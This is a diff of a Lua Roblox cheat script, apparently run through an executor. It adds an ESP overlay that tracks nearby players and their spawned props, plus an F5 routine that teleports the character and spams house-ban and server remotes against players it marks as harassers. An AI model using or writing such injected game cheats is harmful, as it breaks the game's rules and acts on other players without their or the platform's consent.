+    if _G.TXR_InstanceID ~= currentExecutionID then return end
+    if not gameProcessed and input.KeyCode == Enum.KeyCode.RightShift then
+        if gui and gui.Parent then
+            if mainFrame.Visible or openBtnContainer.Visible then
+                mainFrame.Visible = false
+                openBtnContainer.Visible = false
+                aura.Visible = false
+            else
+                openBtnContainer.Visible = true
+                openBtnScale.Scale = 1
+            end
+        end
+    end
+end)
+
+-- =================================================================
+-- 🚨 RGB THREAT RADAR ENGINE
+-- =================================================================
+local threatGuiParent = game:GetService("CoreGui")
+pcall(function() if not threatGuiParent then threatGuiParent = lp:WaitForChild("PlayerGui") end end)
+if _G.TXR_THREAT_ESP and _G.TXR_THREAT_ESP.Parent then _G.TXR_THREAT_ESP:Destroy() end
+
+local threatEspGui = Instance.new("ScreenGui", threatGuiParent)
+threatEspGui.Name = "TXR_ThreatESP_" .. tostring(math.random(100000, 999999))
+threatEspGui.IgnoreGuiInset = true
+_G.TXR_THREAT_ESP = threatEspGui
+
+local activeThreats = {}
+local threatEspObjects = {}
+
+local function getThreatESPContainer(plr)
+    if not threatEspObjects[plr] then
+        local container = Instance.new("Frame", threatEspGui)
+        container.BackgroundTransparency = 1
+        container.Visible = false
+        
+        local box = Instance.new("Frame", container)
+        box.Size = UDim2.new(1, 0, 1, 0)
+        box.BackgroundTransparency = 1
+        local stroke = Instance.new("UIStroke", box)
+        stroke.Thickness = 1
+        
+        local titleLabel = Instance.new("TextLabel", container)
+        titleLabel.Size = UDim2.new(1, 0, 0, 20)
+        titleLabel.Position = UDim2.new(0, 0, 0, -40)
+        titleLabel.BackgroundTransparency = 1
+        titleLabel.Text = "⚠️ TARGET LOCKED ⚠️"
+        titleLabel.Font = Enum.Font.GothamBlack
+        titleLabel.TextSize = 14
+        crispText(titleLabel)
+        
+        local nameLabel = Instance.new("TextLabel", container)
+        nameLabel.Size = UDim2.new(1, 0, 0, 15)
+        nameLabel.Position = UDim2.new(0, 0, 0, -20)
+        nameLabel.BackgroundTransparency = 1
+        nameLabel.Font = Enum.Font.GothamBold
+        nameLabel.TextSize = 13
+        crispText(nameLabel)
+        
+        local detailsLabel = Instance.new("TextLabel", container)
+        detailsLabel.Size = UDim2.new(2.5, 0, 0, 45)
+        detailsLabel.Position = UDim2.new(-0.75, 0, 1, 5)
+        detailsLabel.BackgroundTransparency = 1
+        detailsLabel.Font = Enum.Font.Code
+        detailsLabel.TextSize = 11
+        detailsLabel.TextYAlignment = Enum.TextYAlignment.Top
+        detailsLabel.TextXAlignment = Enum.TextXAlignment.Center
+        crispText(detailsLabel)
+        
+        threatEspObjects[plr] = {
+            container = container, stroke = stroke, title = titleLabel, name = nameLabel, details = detailsLabel, props = {}
+        }
+    end
+    return threatEspObjects[plr]
+end
+
+RunService.Heartbeat:Connect(function()
+    if _G.TXR_InstanceID ~= currentExecutionID then return end
+    if not isSystemActive then return end 
+    
+    local myChar = lp.Character
+    local myRoot = myChar and myChar:FindFirstChild("HumanoidRootPart")
+    if not myRoot then return end
+    
+    local currentFrameThreats = {}
+    local partsInRadius = workspace:GetPartBoundsInRadius(myRoot.Position, 8)
+    for _, part in ipairs(partsInRadius) do
+        if part:IsA("BasePart") and not part:IsDescendantOf(myChar) then
+            local currentInst = part
+            local attackerName = nil
+            while currentInst and currentInst ~= workspace do
+                local match = string.match(currentInst.Name, "^Prop(.+)")
+                if match then attackerName = match; break end
+                currentInst = currentInst.Parent
+            end
+            if attackerName and attackerName ~= lp.Name then
+                local attackerPlayer = Players:FindFirstChild(attackerName)
+                if attackerPlayer then currentFrameThreats[attackerPlayer] = true end
+            end
+        end
+    end
+    
+    for attackerPlayer, _ in pairs(activeThreats) do
+        if not currentFrameThreats[attackerPlayer] then
+            if threatEspObjects[attackerPlayer] then
+                threatEspObjects[attackerPlayer].container.Visible = false
+                if threatEspObjects[attackerPlayer].props then
+                    for _, pLabel in pairs(threatEspObjects[attackerPlayer].props) do pLabel.Visible = false end
+                end
+            end
+        end
+    end
+    activeThreats = currentFrameThreats
+end)
+
+local threatHue = 0
+RunService.RenderStepped:Connect(function(dt)
+    if _G.TXR_InstanceID ~= currentExecutionID then return end 
+    if not threatEspGui.Parent then return end
+    
+    threatHue = (threatHue + (dt * 0.5)) % 1
+    local rgbColor = Color3.fromHSV(threatHue, 1, 1)
+    local camera = workspace.CurrentCamera
+    local myRoot = lp.Character and lp.Character:FindFirstChild("HumanoidRootPart")
+    
+    for plr, _ in pairs(activeThreats) do
+        local esp = getThreatESPContainer(plr)
+        
+        if plr.Character and plr.Character:FindFirstChild("HumanoidRootPart") and plr.Character:FindFirstChild("Head") then
+            local root = plr.Character.HumanoidRootPart
+            local head = plr.Character.Head
+            
+            local topPos = head.Position + Vector3.new(0, 0.5, 0)
+            local bottomPos = root.Position - Vector3.new(0, 3, 0)
+            
+            local topViewport, onScreen1 = camera:WorldToViewportPoint(topPos)
+            local bottomViewport, onScreen2 = camera:WorldToViewportPoint(bottomPos)
+            
+            if onScreen1 or onScreen2 then
+                esp.container.Visible = true
+                local height = math.abs(bottomViewport.Y - topViewport.Y)
+                local width = height * 0.55
+                
+                esp.container.Size = UDim2.new(0, width, 0, height)
+                esp.container.Position = UDim2.new(0, topViewport.X - (width/2), 0, topViewport.Y)
+                
+                local dist = myRoot and math.floor((myRoot.Position - root.Position).Magnitude) or 0
+                
+                local activeProps = {}
+                local com = workspace:FindFirstChild("WorkspaceCom")
+                if com then
+                    for _, folder in ipairs(com:GetChildren()) do
+                        for _, child in ipairs(folder:GetChildren()) do
+                            if child.Name == "Prop" .. plr.Name then table.insert(activeProps, child) end
+                        end
+                    end
+                end
+                
+                esp.stroke.Color = rgbColor
+                esp.title.TextColor3 = rgbColor
+                esp.name.Text = plr.DisplayName .. " (@" .. plr.Name .. ")"
+                esp.name.TextColor3 = rgbColor
+                esp.details.Text = string.format("DISTANCE: %dm\nPROPS SPAWNED: %d", dist, #activeProps)
+                esp.details.TextColor3 = rgbColor
+                
+                for i, prop in ipairs(activeProps) do
+                    local propPart = prop:IsA("Model") and (prop.PrimaryPart or prop:FindFirstChildWhichIsA("BasePart")) or (prop:IsA("BasePart") and prop or nil)
+                    if propPart then
+                        local pScreen, pOnScreen = camera:WorldToViewportPoint(propPart.Position)
+                        local pLabel = esp.props[i]
+                        if not pLabel then
+                            pLabel = Instance.new("TextLabel", threatEspGui)
+                            pLabel.BackgroundTransparency = 1
+                            pLabel.Font = Enum.Font.GothamBold
+                            pLabel.TextSize = 10
+                            crispText(pLabel)
+                            esp.props[i] = pLabel
+                        end
+                        if pOnScreen then
+                            pLabel.Visible = true
+                            pLabel.Position = UDim2.new(0, pScreen.X, 0, pScreen.Y)
+                            pLabel.Text = "⚠️ " .. plr.Name .. "'s Prop"
+                            pLabel.TextColor3 = rgbColor
+                        else
+                            pLabel.Visible = false
+                        end
+                    end
+                end
+                
+                for i = #activeProps + 1, #esp.props do
+                    if esp.props[i] then esp.props[i].Visible = false end
+                end
+                
+            else
+                esp.container.Visible = false
+                if esp.props then for _, pLabel in pairs(esp.props) do pLabel.Visible = false end end
+            end
+        else
+            esp.container.Visible = false
+            if esp.props then for _, pLabel in pairs(esp.props) do pLabel.Visible = false end end
+        end
+    end
+end)
+
+Players.PlayerRemoving:Connect(function(plr)
+    activeThreats[plr] = nil
+    if threatEspObjects[plr] then
+        if threatEspObjects[plr].props then
+            for _, pLabel in pairs(threatEspObjects[plr].props) do pLabel:Destroy() end
+        end
+        threatEspObjects[plr].container:Destroy()
+        threatEspObjects[plr] = nil
+    end
+end)
+
+-- =================================================================
+-- 🚀 SMART PROP-BANG REMOVER (F5 KEYBIND & PIGGYBACK SAFE) 🚀
+-- =================================================================
+local isSmartClearing = false
+UserInputService.InputBegan:Connect(function(input, gameProcessed)
+    if _G.TXR_InstanceID ~= currentExecutionID then return end
+    if not gameProcessed and input.KeyCode == Enum.KeyCode.F5 and not isSmartClearing then
+        isSmartClearing = true
+        
+        task.spawn(function()
+            local success, err = pcall(function()
+                local houseData = getMyHouse()
+                local hrp = lp.Character and lp.Character:FindFirstChild("HumanoidRootPart")
+                
+                if hrp and houseData then
+                    local originalPos = hrp.CFrame
+                    local safePos = houseData.Lot.WorldPivot.Position + Vector3.new(0, 3, 0)
+                    
+                    local attackersToBan = {}
+                    local protectedVictims = {}
+
+                    for _, desc in ipairs(lp.Character:GetDescendants()) do
+                        if desc:IsA("Weld") or desc:IsA("Motor6D") or desc:IsA("WeldConstraint") then
+                            local p0, p1 = desc.Part0, desc.Part1
+                            local otherPart = (p0 and not p0:IsDescendantOf(lp.Character) and p0) or (p1 and not p1:IsDescendantOf(lp.Character) and p1)
+                            if otherPart then
+                                local model = otherPart:FindFirstAncestorOfClass("Model")
+                                if model and model ~= lp.Character then
+                                    local vicPlayer = Players:GetPlayerFromCharacter(model)
+                                    if vicPlayer then
+                                        protectedVictims[vicPlayer] = true
+                                        protectedVictims[model] = true
+                                    end
+                                end
+                            end
+                        end
+                    end
+
+                    local boundParts = workspace:GetPartBoundsInRadius(hrp.Position, 40)
+                    for _, obj in ipairs(boundParts) do
+                        if string.sub(obj.Name, 1, 4) == "Prop" then
+                            local ownerName = string.sub(obj.Name, 5)
+                            if ownerName ~= "" and ownerName ~= lp.Name then
+                                local p = Players:FindFirstChild(ownerName)
+                                if p and not protectedVictims[p] then 
+                                    attackersToBan[p] = true 
+                                end
+                            end
+                        end
+                        local pModel = obj:FindFirstAncestorOfClass("Model")
+                        if pModel and pModel ~= lp.Character and not protectedVictims[pModel] then
+                            local p = Players:GetPlayerFromCharacter(pModel)
+                            if p and not protectedVictims[p] then 
+                                attackersToBan[p] = true 
+                            end
+                        end
+                    end
+
+                    for _, desc in ipairs(lp.Character:GetDescendants()) do
+                        if desc:IsA("Weld") or desc:IsA("SeatWeld") then
+                            local safeParts = {}
+                            if desc.Part0 then table.insert(safeParts, desc.Part0) end
+                            if desc.Part1 then table.insert(safeParts, desc.Part1) end
+                            
+                            for _, pt in ipairs(safeParts) do
+                                if not pt:IsDescendantOf(lp.Character) then
+                                    if string.sub(pt.Name, 1, 4) == "Prop" then
+                                        local ownerName = string.sub(pt.Name, 5)
+                                        if ownerName ~= "" and ownerName ~= lp.Name then
+                                            local p = Players:FindFirstChild(ownerName)
+                                            if p and not protectedVictims[p] then 
+                                                attackersToBan[p] = true 
+                                            end
+                                        end
+                                    end
+                                end
+                            end
+                        end
+                    end
+
+                    rawhrp = hrp
+                    hrp.CFrame = CFrame.new(safePos)
+                    
+                    local isCleared = false
+                    local safetyCounter = 0
+                    
+                    while not isCleared and safetyCounter < 70 do
+                        task.wait(0.01) 
+                        safetyCounter = safetyCounter + 1
+                        
+                        local foundProp = false
+                        local com = workspace:FindFirstChild("WorkspaceCom")
+                        if com then
+                            for _, f in ipairs(com:GetChildren()) do
+                                for _, c in ipairs(f:GetChildren()) do
+                                    if string.sub(c.Name, 1, 4) == "Prop" and string.sub(c.Name, 5) ~= lp.Name then
+                                        local pt = c:FindFirstChildWhichIsA("BasePart") or c.PrimaryPart
+                                        if pt and (pt.Position - rawhrp.Position).Magnitude < 25 then
+                                            local ownerName = string.sub(c.Name, 5)
+                                            local p = Players:FindFirstChild(ownerName)
+                                            if p and not protectedVictims[p] then 
+                                                attackersToBan[p] = true 
+                                            end
+                                            foundProp = true
+                                            break
+                                        end
+                                    end
+                                end
+                                if foundProp then break end
+                            end
+                        end
+
+                        if not foundProp then
+                            isCleared = true
+                        end
+                    end
+                    
+                    if houseData.Disallow then
+                        for attacker, _ in pairs(attackersToBan) do
+                            if attacker and attacker.Parent and not protectedVictims[attacker] then
+                                task.spawn(function() pcall(function() houseData.Disallow:FireServer(attacker) end) end)
+                            end
+                        end
+                    end
+
+                    if houseData.Remote then
+                        for i = 1, 20 do
+                            task.spawn(function() pcall(function() houseData.Remote:InvokeServer() end) end)
+                            task.wait(0.01)
+                        end
+                    end
+
+                    hrp.CFrame = originalPos
+                    
+                    if houseData.Allow then
+                        for attacker, _ in pairs(attackersToBan) do
+                            if attacker and attacker.Parent and not protectedVictims[attacker] then
+                                task.spawn(function()
+                                    task.wait(0.5)
+                                    pcall(function() houseData.Allow:FireServer(attacker) end)
+                                end)
+                            end
+                        end
+                    end
+
+                    sendNotif("SMART CLEAR", "Bang Props Banned & Cleared!", 2)
+                else
+                    if not houseData then
+                        sendNotif("⚠️ HOUSE REQUIRED", "House spawn nahi hai! Please pehle house spawn karo.", 3)
+                    end
+                end
+            end)
+            
+            if not success then warn("TXR Error:", err) end
+            isSmartClearing = false
+        end)
+    end
+end)
